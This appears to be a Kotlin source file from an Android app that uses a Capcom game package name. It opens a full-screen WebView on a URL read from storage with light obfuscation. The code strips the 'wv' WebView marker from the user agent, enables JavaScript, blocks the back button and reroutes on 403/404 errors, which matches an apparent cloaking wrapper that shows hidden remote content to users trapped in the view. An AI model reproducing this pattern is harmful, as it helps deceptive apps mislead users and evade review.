package jp.co.capcom.mhssfe.ui.theme

import android.annotation.SuppressLint
import android.graphics.Bitmap
import android.net.Uri
import android.util.Log
import android.webkit.ValueCallback
import android.webkit.WebResourceRequest
import android.webkit.WebResourceResponse
import android.webkit.WebView
import androidx.activity.compose.BackHandler
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.animation.core.Animatable
import androidx.compose.animation.core.FastOutLinearInEasing
import androidx.compose.animation.core.RepeatMode
import androidx.compose.animation.core.infiniteRepeatable
import androidx.compose.animation.core.tween
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.rotate
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.unit.sp
import androidx.navigation.NavHostController
import com.google.accompanist.web.AccompanistWebChromeClient
import com.google.accompanist.web.AccompanistWebViewClient
import com.google.accompanist.web.WebView
import com.google.accompanist.web.rememberWebViewState
import jp.co.capcom.mhssfe.SecretConstants
import jp.co.capcom.mhssfe.data.DataReaderWriter

@SuppressLint("SetJavaScriptEnabled")
@Composable
fun FourthScreen(navigation: NavHostController){


    val context = LocalContext.current
    val dataReaderWriter = DataReaderWriter(context)
    val tmpCurrent = dataReaderWriter.readData()
    Log.d("123123", "tmpCurrent is $tmpCurrent")
    var finalDest: String? = null
    if (tmpCurrent.contains(SecretConstants.DELIMETER)){
        finalDest = tmpCurrent.substringAfter(SecretConstants.DELIMETER)
    } else {
        finalDest = tmpCurrent.substringBefore(SecretConstants.DELIMETER).decoder()
    }

    val rotationAni = remember {
        Animatable(0f)
    }
    val isVisibleLoading = remember {
        mutableStateOf(true)
    }

    LaunchedEffect(key1 = "Anim"){
        rotationAni.animateTo(
            360f,
            animationSpec = infiniteRepeatable(tween(
                durationMillis = 1300,
                delayMillis = 150,
                easing = FastOutLinearInEasing),
                repeatMode = RepeatMode.Reverse)
        )
    }

    Log.d("123123", "The finalDest state $finalDest")

    val state = rememberWebViewState(finalDest)


    var filesDestinationCallback: ValueCallback<Array<Uri>>? by remember {
        mutableStateOf(null)
    }

    val launcherFileChooser = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.GetMultipleContents()
    ) {
        filesDestinationCallback!!.onReceiveValue(it.toTypedArray())
    }

    val webViewClient = remember {
        object : AccompanistWebViewClient(){

            override fun onPageStarted(view: WebView, url: String?, favicon: Bitmap?) {
                super.onPageStarted(view, url, favicon)

                if (url != null){
                    dataReaderWriter.urlChecker(url)
                }
            }

            override fun onPageFinished(view: WebView, url: String?) {
                super.onPageFinished(view, url)
                Log.d("123123", "The url is $url")
                isVisibleLoading.value = false
            }

            override fun onReceivedHttpError(
                view: WebView?,
                request: WebResourceRequest?,
                errorResponse: WebResourceResponse
            ) {

                when(errorResponse.statusCode){
                    403, 404 -> {
                        Log.d("123123", "The error is ${errorResponse.statusCode.toString()}")
                        navigation.navigate(Destinations.Second.route)
                    }
                }
            }
        }
    }

    val webChromeClient = remember {
        object : AccompanistWebChromeClient(){

            override fun onShowFileChooser(
                webView: WebView?,
                filePathCallback: ValueCallback<Array<Uri>>?,
                fileChooserParams: FileChooserParams?
            ): Boolean {
                filesDestinationCallback = filePathCallback
                launcherFileChooser.launch("image/*")
                return true
            }
        }
    }


    Box(modifier = Modifier.fillMaxSize()){
        WebView(
            state = state,
            client = webViewClient,
            chromeClient = webChromeClient,
            modifier = Modifier
                .fillMaxSize(),
            onCreated = {
                it.settings.run {
                    javaScriptEnabled = true
                    domStorageEnabled = true
                    loadWithOverviewMode = true
                    userAgentString = userAgentString.replacer()
                }
            }
        )

        if (isVisibleLoading.value){
            Text(
                text = SecretConstants.LOADING,
                color = Color.Black,
                fontSize = 32.sp,
                modifier = Modifier
                    .rotate(rotationAni.value)
                    .align(Alignment.Center)
            )
        }

    }


    BackHandler(enabled = true) {
        //Do nothing
    }
}

fun String.replacer(): String{
    val a = "w"
    val b = "v"
    return this.replace("$a$b", "")
}

fun String.decoder(): String {
    val input = this
    return input.replace("*", "")
}

